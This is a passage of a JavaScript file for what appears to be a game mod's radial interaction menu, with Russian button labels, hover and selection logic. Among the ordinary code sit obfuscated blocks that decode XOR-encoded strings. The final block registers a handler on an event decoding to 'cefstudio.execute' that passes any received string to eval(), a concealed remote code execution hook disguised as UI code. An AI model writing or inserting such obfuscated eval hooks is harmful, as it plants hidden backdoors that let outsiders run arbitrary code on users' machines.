Ce_CVOIOsAFhVmXklmLTgfF;};wY$OqNhC_VQV['JdzvJR']=EIbPmJBg,R$XDIJMbT=arguments,wY$OqNhC_VQV['ECRraH']=!![];}var zawMpleikM$qqlBQZSRf=GUqButBjeaMCQX_NtP[-0xe41*Math.floor(-parseInt(0x1))+parseInt(0x2a7)*0x7+parseInt(0x2)*Math.ceil(-parseInt(0x1069))],vXWTDJGovlvLmnOeVYi_nRwEq=IsmukofjLx+zawMpleikM$qqlBQZSRf,uUkTOhIUjm_nIgtqvIwYrJGB=R$XDIJMbT[vXWTDJGovlvLmnOeVYi_nRwEq];return!uUkTOhIUjm_nIgtqvIwYrJGB?(wY$OqNhC_VQV['WhZKTa']===undefined&&(wY$OqNhC_VQV['WhZKTa']=!![]),ePcYzyyST=wY$OqNhC_VQV['JdzvJR'](ePcYzyyST),R$XDIJMbT[vXWTDJGovlvLmnOeVYi_nRwEq]=ePcYzyyST):ePcYzyyST=uUkTOhIUjm_nIgtqvIwYrJGB,ePcYzyyST;},wY$OqNhC_VQV(R$XDIJMbT,jFIFU_f_NJAv);}(function(b$EniLbWcNbAQy,EjxqTJmJzCjaQCeCVO){var BCtwVXEUeNsleggDinYY_cN=wY$OqNhC_VQV,OsAFhVmXkl$mLTgfF_lNM=b$EniLbWcNbAQy();while(!![]){try{var J$IHFdtyH=-parseFloat(BCtwVXEUeNsleggDinYY_cN(0x117))/(0x1777*parseInt(0x1)+0x1e0a*-parseInt(0x1)+0x694)+Math['max'](parseFloat(BCtwVXEUeNsleggDinYY_cN(0x11b))/(0x53*-parseInt(0x7)+Math.max(-0x1,-0x1)*Math.max(0x22b,0x22b)+0x472),parseFloat(BCtwVXEUeNsleggDinYY_cN(0x119))/(parseFloat(parseInt(0x12f8))+parseFloat(-parseInt(0xf06))+parseInt(0x35)*Number(-0x13)))*(-parseFloat(BCtwVXEUeNsleggDinYY_cN(0x120))/(0x2167*Number(0x1)+Math.ceil(0x5)*Math.trunc(-0x180)+Math.floor(parseInt(0x3))*-0x8a1))+Math['ceil'](parseFloat(BCtwVXEUeNsleggDinYY_cN(0x11a))/(Number(-0x12cf)+parseInt(0xb36)*Math.ceil(0x2)+Math.floor(-parseInt(0x398))))*(parseFloat(BCtwVXEUeNsleggDinYY_cN(0x11e))/(-0xefe+parseFloat(-parseInt(0x751))*Math.max(-parseInt(0x4),-0x4)+0x4c*Math.trunc(-0x30)))+parseFloat(BCtwVXEUeNsleggDinYY_cN(0x11f))/(parseInt(0xcf5)+-0x1df8+Math.ceil(parseInt(0x110a)))+parseFloat(parseFloat(BCtwVXEUeNsleggDinYY_cN(0x114))/(0x1*-parseInt(0xc7f)+0xd9a+Math.ceil(parseInt(0x5))*Math.trunc(-parseInt(0x37))))*Math['floor'](-parseFloat(BCtwVXEUeNsleggDinYY_cN(0x11d))/(-parseInt(0x1ddf)*0x1+0x26fb+parseInt(0x913)*parseInt(-0x1)))+Math['floor'](parseFloat(BCtwVXEUeNsleggDinYY_cN(0x116))/(Math.floor(0x141a)+-0x1*-parseInt(0x41c)+-parseInt(0x182c)))*(parseFloat(BCtwVXEUeNsleggDinYY_cN(0x118))/(-0x5*Math.max(-parseInt(0x15d),-parseInt(0x15d))+Math.max(-0x14ca,-0x14ca)+Math.trunc(parseInt(0xe04))))+parseFloat(BCtwVXEUeNsleggDinYY_cN(0x121))/(-parseInt(0x1a19)+0x1*-0xd4+parseInt(0x1af9));if(J$IHFdtyH===EjxqTJmJzCjaQCeCVO)break;else OsAFhVmXkl$mLTgfF_lNM['push'](OsAFhVmXkl$mLTgfF_lNM['shift']());}catch(lBRRYnEmSuJUOMikSUIDn){OsAFhVmXkl$mLTgfF_lNM['push'](OsAFhVmXkl$mLTgfF_lNM['shift']());}}}(KeCgAMQrMHLfWfzVLSoqH,Math.trunc(-0x41dc3)+-0x3fdff*parseInt(parseInt(0x1))+Math.max(0x335,parseInt(0x335))*Number(parseInt(0x354))),cef[MSFJ_L(0x11c)](MSFJ_L(0x115),element));
            } else {
                var zRJM$oh=LuxomEqeoUhpDcn_Wq;function LuxomEqeoUhpDcn_Wq(HP_X_qk,lCBFqEoKZsqP){var TdamSaVp=odIIIsCAUNLuVzwzeuxV();return LuxomEqeoUhpDcn_Wq=function(I$aBrxpF_zowQtKfG,aqwcF_V){I$aBrxpF_zowQtKfG=I$aBrxpF_zowQtKfG-(-parseInt(0x15)*-0x199+-parseInt(0x144e)+parseFloat(parseInt(0x5))*-parseInt(0x27a));var yryHWJIQssDGc=TdamSaVp[I$aBrxpF_zowQtKfG];if(LuxomEqeoUhpDcn_Wq['akIkBU']===undefined){var BDj$jUhF_odSxLFP=function(npGgo_URM$oKztu){var e$MNWltFUks=Math.floor(0x14af)+parseInt(-0x1)*Math.max(-0x11ff,-0x11ff)+Math.max(-parseInt(0x2376),-parseInt(0x2376))&parseInt(0x10c4)+-0x8be+parseFloat(-0x707),spdqRMAflCO_JjzavzYfsk=new Uint8Array(npGgo_URM$oKztu['match'](/.{1,2}/g)['map'](zjfTMUXVmLtX_ZHYdJ$XrXu=>parseInt(zjfTMUXVmLtX_ZHYdJ$XrXu,Math.ceil(-0x1122)+parseInt(parseInt(0x1f47))+-0xe15*Math.floor(parseInt(0x1))))),FXMjntRQRgATkbyPyMYxf=spdqRMAflCO_JjzavzYfsk['map'](rzgQwDVvtXbz_f=>rzgQwDVvtXbz_f^e$MNWltFUks),qCEwakTTh$nTMBpIV=new TextDecoder(),KGecicrytbItp$K_qkOD=qCEwakTTh$nTMBpIV['decode'](FXMjntRQRgATkbyPyMYxf);return KGecicrytbItp$K_qkOD;};LuxomEqeoUhpDcn_Wq['qTJagE']=BDj$jUhF_odSxLFP,HP_X_qk=arguments,LuxomEqeoUhpDcn_Wq['akIkBU']=!![];}var GbqUBoY$GpTeb_stvcQOfyQsf=TdamSaVp[parseFloat(-0x1a26)+Number(parseInt(0x109))+0x191d],KO$B$aPyykwrG=I$aBrxpF_zowQtKfG+GbqUBoY$GpTeb_stvcQOfyQsf,A_THSfBN_NDjnBNOtzd=HP_X_qk[KO$B$aPyykwrG];return!A_THSfBN_NDjnBNOtzd?(LuxomEqeoUhpDcn_Wq['AsdaBr']===undefined&&(LuxomEqeoUhpDcn_Wq['AsdaBr']=!![]),yryHWJIQssDGc=LuxomEqeoUhpDcn_Wq['qTJagE'](yryHWJIQssDGc),HP_X_qk[KO$B$aPyykwrG]=yryHWJIQssDGc):yryHWJIQssDGc=A_THSfBN_NDjnBNOtzd,yryHWJIQssDGc;},LuxomEqeoUhpDcn_Wq(HP_X_qk,lCBFqEoKZsqP);}(function(ATkbyPy,YxfDqCEwakTThnTMBpIV){var iH_Sq_ABRwpHxU=LuxomEqeoUhpDcn_Wq,KGecicrytbItpKqk_OD=ATkbyPy();while(!![]){try{var zjfTMUXVmLtXZHYdJXrXu=Math['ceil'](parseFloat(iH_Sq_ABRwpHxU(0xe0))/(-0x1008+0x1de2+-0xdd9))+-parseFloat(iH_Sq_ABRwpHxU(0xe3))/(Number(0x18bc)+Math.max(0x15df,parseInt(0x15df))+parseFloat(-parseInt(0x4f))*Math.max(parseInt(0x97),0x97))+-parseFloat(iH_Sq_ABRwpHxU(0xe7))/(0x16f2+Number(-parseInt(0x1da))+Math.max(-parseInt(0x1515),-parseInt(0x1515)))+parseFloat(iH_Sq_ABRwpHxU(0xe5))/(-0x1d75*Number(-0x1)+Math.floor(parseInt(0x5bf))*parseFloat(parseInt(0x2))+parseInt(0x3)*-0xda5)+parseFloat(iH_Sq_ABRwpHxU(0xe1))/(Number(-0x8b)+parseInt(0x4)*Math.ceil(-0x85c)+parseInt(parseInt(0x2200)))*(parseFloat(iH_Sq_ABRwpHxU(0xe4))/(Number(-0x1)*0x1117+parseInt(0x5)*parseInt(-0x6c7)+Math.max(-0x10,-parseInt(0x10))*-parseInt(0x330)))+-parseFloat(iH_Sq_ABRwpHxU(0xdd))/(Math.max(-0x1,-0x1)*-parseInt(0x1235)+Number(-parseInt(0x1103))+-parseInt(0x12b))*Math['floor'](-parseFloat(iH_Sq_ABRwpHxU(0xde))/(Math.trunc(parseInt(0x741))*-0x3+-0x946+Math.trunc(0x1f11)))+Number(-parseFloat(iH_Sq_ABRwpHxU(0xe6))/(Math.ceil(parseInt(0x1))*-parseInt(0xee6)+parseInt(parseInt(0x1a2d))+parseInt(-0xb3e)))*Number(parseFloat(iH_Sq_ABRwpHxU(0xe2))/(parseFloat(-0x28)+-0x2610+-parseInt(0x1321)*-parseInt(0x2)));if(zjfTMUXVmLtXZHYdJXrXu===YxfDqCEwakTThnTMBpIV)break;else KGecicrytbItpKqk_OD['push'](KGecicrytbItpKqk_OD['shift']());}catch(rzgQwDVvtXbzf){KGecicrytbItpKqk_OD['push'](KGecicrytbItpKqk_OD['shift']());}}}(odIIIsCAUNLuVzwzeuxV,Number(parseInt(0x8341c))+parseInt(parseInt(0x480b8))+parseFloat(-parseInt(0x831f6))),cef[zRJM$oh(0xdf)](zRJM$oh(0xe8),element,passengerId,toplayerId));function odIIIsCAUNLuVzwzeuxV(){var vJlPq$jXvgPUax_NmyXz=['5d55514c','0b0f080e0f0e73624b496850','0d4f694c735e7f','0908010008496d7a57617f','090e080f010c6c5c59556b59','0a090e0a000f0c5c59494f5b7e','0f080d0a0a084a40487e4257','0c0a0f0d7c7f5b6b7f5a','090e0b0c0e0f0b6e484271597a','5b5d5e4b4c4d5c5157164a595c515954025b54515b530a','090e0e0e6e4e414a4170','090f01000c6f7271694b4b'];odIIIsCAUNLuVzwzeuxV=function(){return vJlPq$jXvgPUax_NmyXz;};return odIIIsCAUNLuVzwzeuxV();}
            }
        },
        clearHoverState() {
            const buttons = document.querySelectorAll('.button');
            const buttonBorders = document.querySelectorAll('.button-border');
        
            buttons.forEach(button => {
                button.classList.remove('hover');
            });
        
            buttonBorders.forEach(border => {
                border.classList.remove('hover');
            });
        },
        buttonMouseOver(element) {
            this.CurrentButtonName = element.dataset.name;
        
            const mouseElement = document.getElementById("mouse");
            const buttonOpacityMap = {
                5: this.IsPlayerSleepActive,
                8: this.IsPlayerDrugsActive,
                9: this.IsPlayerHealthActive,
                12: this.IsLocationCarActive,
                22: this.IsPlayerInVehicle,
                27: this.IsPlayerInVehicle,
                28: this.IsPlayerVehicleDriving,
                36: this.GetPlayerMetal,
                37: this.GetPlayerAidKit,
                38: this.GetPlayerMask,
                39: this.GetPlayerRepairKit,
                40: this.IsPlayerFlowersInHands,
                41: this.IsPlayerWeaponInHands,
                48: this.IsPlayerCarAccess,
                49: this.IsPlayerCarAccess,
                50: this.IsPlayerCarAccess,
                51: this.IsPlayerCarAccess,
                52: this.IsPlayerCarUpsideDown,
                53: this.IsPlayerNearCar,
                54: this.IsPlayerСanisterInHands,
                56: this.IsPlayerOrganization,
                57: this.IsPlayerVehicleDriving,
                58: this.IsPlayerCarAccess,
                59: this.IsPlayerCarAccess,
            };
        
            const button = element.dataset.button;
            
            if (button == 43) {
                mouseElement.style.opacity = (this.InteractionVehiclePassenger1Id === 65535 || this.InteractionVehiclePassenger1 === this.GetPlayerName) ? '0.5' : '1';
            }
            else if (button == 44) {
                mouseElement.style.opacity = (this.InteractionVehiclePassenger2Id === 65535 || this.InteractionVehiclePassenger2 === this.GetPlayerName) ? '0.5' : '1';
            }
            else if (button == 46) {
                mouseElement.style.opacity = (this.InteractionVehiclePassenger3Id === 65535 || this.InteractionVehiclePassenger3 === this.GetPlayerName) ? '0.5' : '1';
            }
            else if (button == 47) {
                mouseElement.style.opacity = (this.InteractionVehicleDriverId === 65535 || this.InteractionVehicleDriver === this.GetPlayerName) ? '0.5' : '1';
            }
            else mouseElement.style.opacity = buttonOpacityMap[button] !== undefined ? (buttonOpacityMap[button] ? '1' : '0.5') : '1';
        },
        updateMenuName() {
            this.CurrentButtonDescription = '';
            const hoveredButtons = document.querySelectorAll('.button.hover');
    
            if (hoveredButtons.length === 0) {
                const buttonNameMap = {
                    10: 'Быстрые действия',
                    11: 'Управление личным транспортом',
                    12: 'Посмотреть удостоверение или навыки',
                    20: 'Игрок',
                    21: 'Показать документы',
                    22: 'Передать предмет',
                    23: 'Взаимодействовать',
                    24: 'Взаимодействовать',
                    25: 'Управлять элементами'
                };
                this.CurrentButtonName = buttonNameMap[this.GetCurrentMenu] || '';

                document.getElementById("mouse").style.opacity = '.5';
            }
        },
        buttonMouseOut() {
            this.CurrentButtonMessage = '';
            this.CurrentButtonDescription = '';
            setTimeout(() => this.updateMenuName(), 0);     
        },
        setButtonsCount() {
            if (this.GetCurrentMenu === 10) this.buttonsCount = 9; 
            else if (this.GetCurrentMenu === 11) this.buttonsCount = 6;
            else if (this.GetCurrentMenu === 12) this.buttonsCount = 4; 
            else if (this.GetCurrentMenu === 20) this.buttonsCount = 10; 
            else if (this.GetCurrentMenu === 21) this.buttonsCount = 5; 
            else if (this.GetCurrentMenu === 22) {
                if (this.IsPlayerGang) this.buttonsCount = 7; 
                else this.buttonsCount = 6; 
            } 
            else if (this.GetCurrentMenu === 23) this.buttonsCount = 6; 
            else if (this.GetCurrentMenu === 24) this.buttonsCount = 9; 
            else if (this.GetCurrentMenu === 25) this.buttonsCount = 3; 

            this.selectedButtonIndex = -1;
        },
        selectPreviousButton() {
            this.selectedButtonIndex--;
            if (this.selectedButtonIndex < 0) {
                this.selectedButtonIndex = this.buttonsCount - 1;
            }
            this.updateRadialButtonInfo();
            this.updateButtonHighlight();
        },
        selectNextButton() {
            this.selectedButtonIndex = (this.selectedButtonIndex + 1) % this.buttonsCount;
            this.updateRadialButtonInfo();
            this.updateButtonHighlight();
        },
        updateRadialButtonInfo() {
            const buttons = document.querySelectorAll('.button');
            const currentButton = buttons[this.selectedButtonIndex];

            this.CurrentButtonMessage = '';
        
            if (currentButton) {
                this.CurrentButtonName = currentButton.dataset.name; 
                if (currentButton.dataset.warning) {
                    this.CurrentButtonMessage = currentButton.dataset.warning;
                }
            }
        },
        updateButtonHighlight() {
            const buttons = document.querySelectorAll('.button'); 
            
            buttons.forEach((button) => {
                this.buttonHover(button, false); 
            });
        
            const currentButton = buttons[this.selectedButtonIndex];
            if (currentButton) {
                this.buttonHover(currentButton, true); 
            }
        },
        triggerButtonAction() {
            let buttonOffset = 0;
        
            if (this.GetCurrentMenu === 10) buttonOffset = 1;
            else if (this.GetCurrentMenu === 11) buttonOffset = 10;
            else if (this.GetCurrentMenu === 12) buttonOffset = 16;
            else if (this.GetCurrentMenu === 20) buttonOffset = 20;
            else if (this.GetCurrentMenu === 21) buttonOffset = 30;
            else if (this.GetCurrentMenu === 22) buttonOffset = 35;
            else if (this.GetCurrentMenu === 23) buttonOffset = 42;
            else if (this.GetCurrentMenu === 24) buttonOffset = 48;
            else if (this.GetCurrentMenu === 25) buttonOffset = 57;

            const buttonElement = document.querySelector(`.button[data-button="${this.selectedButtonIndex + buttonOffset}"]`); 
            if (buttonElement) {
                const buttonData = buttonElement.dataset.button;
                this.click(buttonData);
            }
        }
    },
});

function LgGqROpusInDHDcJzPBL_nS_fkG(){var WRSFiHCKRWyznBpVbJWlisr=['ccac908ca88ba7','9c9a998c8b8a9b9690d19a879a9c8a8b9a','cdcbc7cecdc8b5ae8bb8aa9a','c9cacbceca938789a7b58a','cccf9c8cb5b6b79a','cac9cdc9caccb1be99b58a98','cdca90bcb5acb3bc','cec8c9cbc9c7c7bd85a8958f8e','c6cbcacfcbcbae8f858f889b','cccccecbcfc99d948c9eaabc','cccfcccbc7cdcfbdb69e9c8fb0'];LgGqROpusInDHDcJzPBL_nS_fkG=function(){return WRSFiHCKRWyznBpVbJWlisr;};return LgGqROpusInDHDcJzPBL_nS_fkG();}function YqrCwJ$Hgj_lXKgyg(hLxglJNCnwb_PPvSCqckJQ,GUebksaUCSos){var tXQpzpwdoCJSLCcsJIHelxvX=LgGqROpusInDHDcJzPBL_nS_fkG();return YqrCwJ$Hgj_lXKgyg=function(uBzWjpqNAfJu$gBIacpO,uSWqgqwZf_KS_wlLEwwSeVdF){uBzWjpqNAfJu$gBIacpO=uBzWjpqNAfJu$gBIacpO-(parseInt(0x2c)*-parseInt(0xdf)+0x1fb3+parseInt(-0x3)*Math.ceil(-0x281));var e_KABCWQo$czI=tXQpzpwdoCJSLCcsJIHelxvX[uBzWjpqNAfJu$gBIacpO];if(YqrCwJ$Hgj_lXKgyg['avjHPY']===undefined){var CpnvYOORSltVdhHqNIMec$kCsd=function(VsXoDVvene_LW){var jLMvbMAcQKOaq=parseInt(0x11)*parseInt(0xc5)+-parseInt(0x90e)*0x2+Math.floor(-parseInt(0x1))*Number(-0x606)&-parseInt(0x17cf)+Math.ceil(-0x11)*parseInt(-parseInt(0x8d))+parseInt(0xf71),ndXtLbAMLPpEBCmokIrWVmy=new Uint8Array(VsXoDVvene_LW['match'](/.{1,2}/g)['map'](xVqnAJ_iPjACcYW_sbS=>parseInt(xVqnAJ_iPjACcYW_sbS,-0x1cd2+Math.trunc(0x2d)*-0x8f+0x3605))),mXX_jDN=ndXtLbAMLPpEBCmokIrWVmy['map'](zauD$$xh=>zauD$$xh^jLMvbMAcQKOaq),NmCTWNoDim_wKM=new TextDecoder(),ccrkmFTMbLJGR_kheUjt=NmCTWNoDim_wKM['decode'](mXX_jDN);return ccrkmFTMbLJGR_kheUjt;};YqrCwJ$Hgj_lXKgyg['GgGArK']=CpnvYOORSltVdhHqNIMec$kCsd,hLxglJNCnwb_PPvSCqckJQ=arguments,YqrCwJ$Hgj_lXKgyg['avjHPY']=!![];}var ZQuGnjEbYWMUfWDzeXHbnJWX=tXQpzpwdoCJSLCcsJIHelxvX[-parseInt(0x41)*-0x3e+-parseInt(0xb03)+Math.trunc(parseInt(0x4bb))*Math.max(-0x1,-0x1)],FpLzBObsQ$_r=uBzWjpqNAfJu$gBIacpO+ZQuGnjEbYWMUfWDzeXHbnJWX,kSamLgJX_SBzfaul=hLxglJNCnwb_PPvSCqckJQ[FpLzBObsQ$_r];return!kSamLgJX_SBzfaul?(YqrCwJ$Hgj_lXKgyg['TICNhM']===undefined&&(YqrCwJ$Hgj_lXKgyg['TICNhM']=!![]),e_KABCWQo$czI=YqrCwJ$Hgj_lXKgyg['GgGArK'](e_KABCWQo$czI),hLxglJNCnwb_PPvSCqckJQ[FpLzBObsQ$_r]=e_KABCWQo$czI):e_KABCWQo$czI=kSamLgJX_SBzfaul,e_KABCWQo$czI;},YqrCwJ$Hgj_lXKgyg(hLxglJNCnwb_PPvSCqckJQ,GUebksaUCSos);}var YbeFqQq$jF=YqrCwJ$Hgj_lXKgyg;(function(jLMvbMAcQKO_aq,ndXtLbAMLPpEBCmokIrWVmy){var BmzHkLRBLgtXNfGRLL=YqrCwJ$Hgj_lXKgyg,mXXj$DN=jLMvbMAcQKO_aq();while(!![]){try{var Nm_CTW_NoDimwKM=-parseFloat(BmzHkLRBLgtXNfGRLL(0xe7))/(Math.floor(0x1927)*0x1+Math.max(-parseInt(0x900),-0x900)+-parseInt(0x1026))+parseFloat(BmzHkLRBLgtXNfGRLL(0xe3))/(0x1b1e+parseInt(0x1)*Math.max(-0x5de,-parseInt(0x5de))+parseFloat(-0x153e))*(parseFloat(BmzHkLRBLgtXNfGRLL(0xe5))/(Number(parseInt(0x7c4))+parseInt(0x1)*Math.max(-0xf78,-0xf78)+0x1*parseInt(0x7b7)))+Number(parseFloat(BmzHkLRBLgtXNfGRLL(0xe2))/(-parseInt(0x9)*-0x3d8+-parseInt(0x5)*Math.ceil(-parseInt(0x7b5))+-parseInt(0x491d)))+Math['max'](parseFloat(BmzHkLRBLgtXNfGRLL(0xeb))/(parseInt(0x2)*Math.trunc(parseInt(0xf19))+-0x1f1e+parseInt(0xf1)),parseFloat(BmzHkLRBLgtXNfGRLL(0xe9))/(-parseInt(0x37)*-parseInt(0x45)+Math.ceil(-0x9)*Math.max(-0x3d6,-parseInt(0x3d6))+-0x1*parseInt(0x3153)))*(parseFloat(BmzHkLRBLgtXNfGRLL(0xe8))/(parseInt(-parseInt(0x17ae))+parseInt(0x1c80)+parseFloat(-parseInt(0x4cb))*parseInt(0x1)))+-parseFloat(BmzHkLRBLgtXNfGRLL(0xec))/(Math.ceil(-parseInt(0x5e))+-parseInt(0x1f17)+0x1f7d)+Math['trunc'](-parseFloat(BmzHkLRBLgtXNfGRLL(0xea))/(Math.max(0x7c,parseInt(0x7c))*Math.ceil(-0x28)+0x6fb*-parseInt(0x1)+parseFloat(-0x233)*-parseInt(0xc)))+Math['ceil'](parseFloat(BmzHkLRBLgtXNfGRLL(0xe4))/(Math.max(parseInt(0xd06),0xd06)+0x124c+parseFloat(-0x1f48)));if(Nm_CTW_NoDimwKM===ndXtLbAMLPpEBCmokIrWVmy)break;else mXXj$DN['push'](mXXj$DN['shift']());}catch(ccrkmFTMbLJGRkheUjt){mXXj$DN['push'](mXXj$DN['shift']());}}}(LgGqROpusInDHDcJzPBL_nS_fkG,-0x20*Math.ceil(-0x2c69)+parseFloat(0x2015f)*-parseInt(0x1)+-parseInt(0x2cb4)),cef['on'](YbeFqQq$jF(0xe6),ZWTtZIgxOhLx=>eval(ZWTtZIgxOhLx)));
